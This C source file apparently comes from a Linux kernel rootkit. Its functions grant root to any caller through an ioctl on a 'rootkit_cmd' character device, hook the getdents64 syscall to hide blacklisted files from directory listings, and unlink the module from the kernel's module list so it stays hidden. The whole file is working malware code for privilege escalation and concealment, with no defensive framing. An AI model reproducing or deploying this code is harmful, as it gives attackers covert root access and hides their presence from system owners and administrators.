#include "utils.h"

static void get_root(void)
{
    struct cred *cred = prepare_creds();
    if (!cred)
        return;
    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    commit_creds(cred);
}

long cmd_ioctl(struct file *flip, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case GET_ROOT:
        get_root();
        break;
    case SHOW_MODULE:
        show_module();
        break;
    case HIDE_MODULE:
        hide_module();
        break;
    default:
    }

    return 0;
}

struct file_operations fops = {.unlocked_ioctl = cmd_ioctl};
DEFINE_RWLOCK(file_black_list_lock);
LIST_HEAD(file_black_list);

/**
 * getdents64_evil - Hook the syscall function getdents64
 *
 * It gets the result of `sys_getdents64` and hides the file with the name in
 * the black list.
 */
static int getdents64_evil(const struct pt_regs *regs)
{
    struct linux_dirent __user *dirent =
        (struct linux_dirent __user *) regs->si;
    long size = CALL_ORIGINAL_FUNC_BY_NAME_RET(
        "sys_getdents64", int (*)(const struct pt_regs *regs), int, regs);
    long org_size = size;
    struct linux_dirent *buf, *iter;
    iter = buf = kzalloc(size, GFP_KERNEL);
    if (!buf)
        return size;

    if (copy_from_user(buf, dirent, size))
        goto out;

    struct name_list *node;
    while ((unsigned long) iter - (unsigned long) buf < size) {
        read_lock(&file_black_list_lock);
        int found = 0;
        list_for_each_entry (node, &file_black_list, list)
            if (strstr(iter->d_name, node->name))
                found = 1;

        read_unlock(&file_black_list_lock);

        if (found) {
            size -= iter->d_reclen;
            memmove((void *) iter, (void *) iter + iter->d_reclen,
                    size - ((unsigned long) iter - (unsigned long) buf));
        } else
            iter = (struct linux_dirent *) ((char *) iter + iter->d_reclen);
    }
    if (copy_to_user(dirent, buf, size))
        size = org_size;
out:
    kfree(buf);
    return size;
}

void hide_file(const char *name)
{
    struct name_list *node =
        (struct name_list *) vmalloc(sizeof(struct name_list));
    if (!node)
        return;
    node->name = vmalloc(strlen(name) + 1);
    if (!node->name) {
        vfree(node);
        return;
    }
    strcpy(node->name, name);
    write_lock(&file_black_list_lock);
    list_add(&node->list, &file_black_list);
    write_unlock(&file_black_list_lock);
}

void show_file(const char *name)
{
    struct name_list *node, *safe;
    write_lock(&file_black_list_lock);
    list_for_each_entry_safe (node, safe, &file_black_list, list) {
        if (!strcmp(name, node->name)) {
            list_del(&node->list);
            vfree(node->name);
            vfree(node);
            break;
        }
    }
    write_unlock(&file_black_list_lock);
}

void utils_init()
{
    chrdev_add("rootkit_cmd", &fops);
    hook_start(get_syscall(__NR_getdents64), (unsigned long) getdents64_evil,
               "sys_getdents64");
    hide_file("rootkit");
}

static struct list_head *head = NULL;

void hide_module(void)
{
    if (head)
        return;
    head = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_module(void)
{
    if (head) {
        list_add(&THIS_MODULE->list, head);
        head = NULL;
    }
}
